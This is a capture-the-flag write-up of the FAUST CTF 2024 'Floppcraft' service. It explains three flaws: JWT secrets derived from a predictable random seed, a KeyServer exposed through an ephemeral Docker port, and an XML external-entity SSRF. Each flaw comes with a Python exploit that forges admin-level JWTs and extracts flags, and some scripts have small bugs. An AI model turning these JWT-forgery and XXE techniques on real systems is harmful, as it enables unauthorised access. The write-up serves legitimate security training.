---
title: "FAUST CTF 2024 - Floppcraft Writeup"
date: 2024-10-11T06:00:00+02:00
author: "Speedy11CZ"
tags: [ "writeups" ]
---
> We participated in FAUST CTF 2024 under the pseudonym "TeamCalabria"
(unfortunately stolen on CTFTime by some CTFTime point hoarders).
Our member _Speedy11CZ_ managed to first blood the "Floppcraft" challenge.

Floppcraft allows users to upload pictures. It also contains some other "secret" endpoints. There are two services:
- Frontend - Flask application, serves content and generates pages.
- KeyServer - Generates secrets for signing JWT tokens inside Frontend application.
Flags are stored inside Frontend service in "intel" category of requests.
It is possible to login using uploading image with "Floppyeti" payload in EXIF data.
Flags can be obtained with level 2 permissions.

## Error in the KeyServer SQL table
There was a invalid SQL table in the KeyServer service. Because of this, status code 500 was returned when generating tokens in the KeyServer. KeyServer would correctly return a number to use as the seed of the random generator, but in this case -1 was used as the seed due to an error and poorly written function.

```py
...
def getNewToken(uuid):
    res = post(TOKENSERVER+"/genNewToken/"+uuid)
    if res.status_code != 200: # KeyServer returns status code 500 because invalid SQL table.
        return -1 # -1 is returned instead of valid token.
    res = get(TOKENSERVER+"/getToken/"+uuid)
    if res.status_code != 200:
        return -1
    return int(res.text[2:-3]) # When the application works correctly, the generated token is returned.
...
```

```py
...
def genSecrets(uuid,token):
    user_secrets.update({uuid:[1 for _ in range(0,NUM_SECRETS+1)]})
    seed(token) # Random generator is seeded with -1 value.
    for i in range(0,NUM_SECRETS):
        user_secrets[uuid][i+1] = randbytes(8)
...
```

```py
...
def addNewToken():
    uuid = str(uuidGen.uuid4())
    genSecrets(uuid,getNewToken(uuid)) # JWT secrets are based on numbers from random generator with seed -1.
    return (uuid,user_secrets[uuid][1])
...
```

The valid JWT token can therefore be signed with a secret from the random generator with seed -1.

### Exploit
```py
...
def get_auth_cookie(title = "randomTitle", image = "image.jpg"):
    im = Image.new("RGB", (100, 100)) # Create a new image
    im.info["exif"] = piexif.dump({"0th": {270: bytes.fromhex("466c6f707079657469").decode('utf-8')}}) # "Floppyti" EXIF data

    imgByteArr = io.BytesIO() # Create a new byte array
    im.save(imgByteArr, format="JPEG", exif=im.info["exif"]) # Save the image to the byte array

    response = requests.post(f"http://[HOST]:5000/upload", data={"title": title}, files={"image": (image, imgByteArr.getvalue())}) # Upload the image to the server
    return response.cookies["auth"] # Return the auth cookie

auth_cookie = get_auth_cookie() # Get the auth cookie
auth = jwt.decode(auth_cookie,options={"verify_signature":False}) # Decode the auth cookie without verifying the signature
auth["level"] = 2 # Set the level to 2

seed(-1) # Seed the random number generator with -1
secret = randbytes(8) # Generate a random 8 byte secret
encoded = jwt.encode(auth,secret,"HS256") # Sign the auth cookie with the secret

response = requests.get(f"http://[HOST]:5000/auth/collectIntel", cookies={"auth":encoded}) # Get the intel from the server
base64_strings = re.findall(r'([A-Za-z0-9+/]+={0,2})', response.text) # Find all base64 strings in the response

for base64_string in base64_strings:
    try:
        decoded = base64.b64decode(base64_string) # Decode the base64 string
        if b"FAUST" in decoded: # Check if the decoded string contains "FAUST"
            print(str(decoded), flush=True) # Print the decoded string
    except Exception as exc:
        pass
...
```

## Docker-Compose Ephemeral port
Docker compose allows you to define an ephemeral port. In this case, docker will attempt to expose the service on the available port. Thus, the KeyServer service has been opened to the Internet by default in docker compose. It was therefore possible to retrieve the generated secret and then reuse it as a seed in a random generator to create a secret for signing a JWT token.
This exploit only worked if the table in KeyServer was fixed.

```yml
...
  KeyServer:
    restart: unless-stopped
    image: faust.cs.fau.de:5000/floppcraft-key-server
    init: true
    build: floppcraft/KeyServer
    ports:
      - '5001' # Ephemeral port
    depends_on:
      postgres:
        condition: service_healthy
...
```

### Exploit
```py
...
def get_auth_cookie(title = "randomTitle", image = "image.jpg"):
    im = Image.new("RGB", (100, 100)) # Create a new image
    im.info["exif"] = piexif.dump({"0th": {270: bytes.fromhex("466c6f707079657469").decode('utf-8')}}) # "Floppyti" EXIF data

    imgByteArr = io.BytesIO() # Create a new byte array
    im.save(imgByteArr, format="JPEG", exif=im.info["exif"]) # Save the image to the byte array

    response = requests.post(f"http://[HOST]:5000/upload", data={"title": title}, files={"image": (image, imgByteArr.getvalue())}) # Upload the image to the server
    return response.cookies["auth"] # Return the auth cookie

def find_exploit_token(auth_uuid):
    result = subprocess.run(["nmap", "-6", "-sS", "-Pn", "-T5", HOST], capture_output=True) # Use nmap to find key server
    ports = re.findall(r"(\d+)/tcp\s+open", result.stdout.decode())
    ports = [int(port) for port in ports]
    for port in ports:
        try:
            response = requests.get(f"http://[{HOST}]:{port}/getToken/{auth_uuid}", timeout=0.1) # Try to request the token
            text = response.text
            if (text.startswith("[") and text.endswith("]\n")) or text.startswith("Not Found"):
                return text
        except Exception as exc:
            pass
    return None

auth_cookie = get_auth_cookie() # Get the auth cookie
auth = jwt.decode(auth_cookie,options={"verify_signature":False}) # Decode the auth cookie without verifying the signature
auth["level"] = 2 # Set the level to 2

token = find_exploit_token(auth["uuid"]) # Get the token from KeyServer
if value is None:
    print("App not running", flush=True) # Server not found protection
    sys.exit(1)


seed(int(value[2:-3])) # Seed with generated token from KeyServer
secret = randbytes(8)
encoded = jwt.encode(auth,secret,"HS256")

response = requests.get(f"http://[HOST]:5000/auth/collectIntel", cookies={"auth":encoded}) # Get the intel from the server
base64_strings = re.findall(r'([A-Za-z0-9+/]+={0,2})', response.text) # Find all base64 strings in the response

for base64_string in base64_strings:
    try:
        decoded = base64.b64decode(base64_string) # Decode the base64 string
        if b"FAUST" in decoded: # Check if the decoded string contains "FAUST"
            print(str(decoded), flush=True) # Print the decoded string
    except Exception as exc:
        pass
...
```

## SSRF attack inside XML payload
It was possible to send a payload in XML format to the frontend service. It allowed to load an external entity from a file and from the web. Then it was possible to get the token in the retrieved data and use it again to generate the secret. Each time a request is made, the newly obtained auth cookie needs to be saved as the application performs secret rotation. Therefore, it is subsequently necessary to use up to the next generated secret several times, as the rotation is done by successive generated secrets.
This exploit only worked if the table in KeyServer was fixed.

```py
...
def parseXMLData(xmlString):
    if not xmlString:
        return None,"Please provide a string"
    reg = regex.compile(r'<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)">')
    for found in reg.finditer(xmlString):
        uri = found.group(2)
        content = ""
        if uri[:4] == "file":
            try:
                content = open(uri[7:],"rb").read()
            except:
                return None,"Couldnt read File"
        elif uri[:4] == "http":
            try:
                content = bytes(urllib.request.urlopen(uri,timeout=3).read()) # Loading token from KeyServer
            except:
                return None,"Couldnt read Website"
        else:
            return None,"Invalid Protocol"
        xmlString = regex.sub(f"{found.group(1)} SYSTEM", found.group(1), xmlString)
        content = str(base64.b64encode(content))[2:-2]
        xmlString = regex.sub(f"{found.group(2)}",content, xmlString)
...
```

### Exploit
```py
...
def get_auth_cookie(title = "randomTitle", image = "image.jpg"):
    im = Image.new("RGB", (100, 100)) # Create a new image
    im.info["exif"] = piexif.dump({"0th": {270: bytes.fromhex("466c6f707079657469").decode('utf-8')}}) # "Floppyti" EXIF data

    imgByteArr = io.BytesIO() # Create a new byte array
    im.save(imgByteArr, format="JPEG", exif=im.info["exif"]) # Save the image to the byte array

    response = requests.post(f"http://[HOST]:5000/upload", data={"title": title}, files={"image": (image, imgByteArr.getvalue())}) # Upload the image to the server
    return response.cookies["auth"] # Return the auth cookie

auth_cookie = get_auth_cookie() # Get the auth cookie
auth = jwt.decode(auth_cookie,options={"verify_signature":False}) # Decode the auth cookie without verifying the signature
auth["level"] = 2 # Set the level to 2

data = {
    'xmlData': f'<!DOCTYPE dataRoot SYSTEM "/src/static/location.dtd" [ <!ENTITY example SYSTEM "http://KeyServer:5001/getToken/{auth["uuid"]}"> ]><dataRoot><formType>location</formType><latitude>-16.984938</latitude><longitude>-162.643507</longitude><description>start&example;end</description></dataRoot>'
} # Malicious payload

response = requests.post(f"http://[{HOST}]:5000/auth/submitIntel", data=data, allow_redirects=False, cookies={"auth": auth_cookie}) # Upload malicious payload
auth_cookie = response.cookies["auth"] # Rotate JWT token

response = requests.get(f"http://[{HOST}]:5000/auth/myRequests", cookies={"auth": auth_cookie}) # Get token from request
token_seed = int(base64.b64decode(re.findall(regex, response.text)[0] + "=")[2:-3]) # Find and decode token

seed(token_seed)
randbytes(8) # first secret (already used)
randbytes(8) # second secret (already used)
secret = randbytes(8) # third secret

encoded = jwt.encode(auth,secret,"HS256")

response = requests.get(f"http://[HOST]:5000/auth/collectIntel", cookies={"auth":encoded}) # Get the intel from the server
base64_strings = re.findall(r'([A-Za-z0-9+/]+={0,2})', response.text) # Find all base64 strings in the response

for base64_string in base64_strings:
    try:
        decoded = base64.b64decode(base64_string) # Decode the base64 string
        if b"FAUST" in decoded: # Check if the decoded string contains "FAUST"
            print(str(decoded), flush=True) # Print the decoded string
    except Exception as exc:
        pass
...
```
